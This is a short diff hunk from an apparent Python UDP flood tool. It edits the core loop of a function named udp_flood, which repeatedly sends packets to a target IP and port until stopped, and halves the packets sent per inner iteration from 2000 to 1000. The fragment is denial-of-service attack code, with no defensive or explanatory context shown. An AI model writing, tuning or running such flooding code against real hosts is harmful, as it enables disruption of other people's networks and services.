@@ -26,7 +26,7 @@ def udp_flood(target_ip, target_port, stop_flag):
 
     while not stop_flag.is_set():  # Check if stop flag is set
         try:
-            for _ in range(2000):  # Reduce inner loop iterations
+            for _ in range(1000):  # Reduce inner loop iterations
                 sock.sendto(data, (target_ip, target_port))
             time.sleep(0.001)  # Small delay to prevent resource exhaustion
         except Exception as e:
